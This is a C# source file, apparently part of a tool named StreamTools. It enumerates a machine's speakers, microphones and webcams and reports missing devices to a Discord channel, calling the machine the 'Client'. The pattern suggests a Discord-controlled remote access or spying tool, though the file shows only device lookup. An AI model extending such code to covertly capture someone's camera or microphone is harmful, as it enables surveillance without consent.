using AForge.Video.DirectShow;
using NAudio.CoreAudioApi;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace StreamTools
{
    public class CameraService
    {
        public CameraService() { }

        public string ReciveHeadphonesList()
        {
            var enumerator = new MMDeviceEnumerator();
            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active); 
            string strings = "";
            if (devices.Count < 1)
            {
                Discord.sendInTry($"Client doesnt have any output audio devices");
                return "";
            }

            int id = -1;
            foreach (var device in devices)
            {
                id++;
                strings += ($"({id}) {device.FriendlyName}\n");
            }

            return strings;
        }

        public string ReciveMicrophoneList()
        {
            var enumerator = new MMDeviceEnumerator();
            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active);
            string strings = "";
            if (devices.Count < 1)
            {
                Discord.sendInTry($"Client doesnt have any input audio devices");
                return "";
            }

            int id = -1;
            foreach (var device in devices)
            {
                id++;
                strings += ($"({id}) {device.FriendlyName}\n");
            }

            return strings;
        }

        public string ReciveHeadphones()
        {
            var enumerator = new MMDeviceEnumerator();
            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);
            List<string> strings = new List<string>();
            if (devices.Count < 1)
            {
                Discord.sendInTry($"Client doesnt have any output audio devices");
                return "";
            }

            foreach (var device in devices)
            {
                strings.Add($"{device.FriendlyName}");
            }

            try
            {
                return strings[DataStorage.inputAudioId];
            }
            catch
            {
                Discord.sendInTry($"Failed to set audio device!");
                return "";
            }
        }

        public string ReciveMicrophone()
        {
            var enumerator = new MMDeviceEnumerator();
            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active);
            List<string> strings = new List<string>();
            if(devices.Count < 1)
            {
                Discord.sendInTry($"Client doesnt have any input audio devices");
                return "";
            }

            foreach (var device in devices)
            {
                strings.Add($"{device.FriendlyName}");
            }

            try {
                return strings[DataStorage.audioId];
            } catch {
                Discord.sendInTry($"Failed to set audio device!");
                return "";
            }
        }

        public string ReciveCamera()
        {
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            List<string> strings = new List<string>();
            if (videoDevices.Count < 1)
            {
                Discord.sendInTry($"Client doesnt have any camera devices");
                return "";
            }

            foreach (FilterInfo device in videoDevices)
            {
                strings.Add($"{device.Name}");
            }

            try
            {
                return strings[DataStorage.videoId];
            } catch {
                Discord.sendInTry($"Failed to set camera device!");
                return "";
            }
        }
    }
}
